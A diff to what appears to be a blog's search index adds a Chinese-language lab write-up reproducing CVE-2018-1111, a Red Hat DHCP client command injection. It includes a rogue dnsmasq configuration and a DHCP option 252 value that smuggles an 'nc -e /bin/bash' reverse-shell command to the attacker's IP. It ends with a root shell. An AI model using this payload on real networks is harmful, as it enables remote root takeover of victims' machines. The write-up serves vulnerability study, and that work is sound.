@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[CVE-2018-1111复现]]></title>
+    <url>%2F2018%2F05%2F20%2FCVE-2018-1111%E5%A4%8D%E7%8E%B0%2F</url>
+    <content type="text"><![CDATA[漏洞原理DynoRoot：Red Hat DHCP客户端命令执行漏洞(CVE-2018-1111)预警 漏洞复现环境 Parallels Desktop kali（攻击机） centos 7（目标主机） 注意： 关闭Parallels Desktoppd host-only模式下的dhcp 开启两台虚拟机，网络模式选择host-only 攻击机配置kali上配置ip信息：12ifconfig eth0 192.168.2.222 netmask 255.255.255.0route add default gw 192.168.2.222 kali上使用nc监听520端口（今天520^^） 1nc -l -p 520 -v 创建一个dnsmasq.conf文件123456789101112131415bind-interfacesinterface=eth0except-interface=lodhcp-range=192.168.2.10,192.168.2.30,22hdhcp-option=3,192.168.2.222dhcp-option=6,192.168.2.222log-querieslog-facility=/var/log/dnsmasq.log 攻击kali机器上运行dnsmasq来伪造dhcp服务器，发起攻击包，这里用nc反弹shell 1dnsmasq -dC dnsmasq.conf --dhcp-option=&quot;252,&apos;&amp;nc -e /bin/bash 192.168.2.222 520 #&quot; dnsmasq运行效果: 此时centos机器获取到了kali机器分配的ip地址： kali端收到了反弹的shell，root权限：]]></content>
+      <tags>
+        <tag>Testing</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[几个高精度IP定位网站]]></title>
     <url>%2F2018%2F05%2F08%2F%E5%87%A0%E4%B8%AA%E9%AB%98%E7%B2%BE%E5%BA%A6IP%E5%AE%9A%E4%BD%8D%E7%BD%91%E7%AB%99%2F</url>
     <content type="text"><![CDATA[几个高精度IP定位网站：https://ip.rtbasia.com/https://www.opengps.cn/Data/IP/LocHighAcc.aspxhttp://www.ipplus360.com/]]></content>
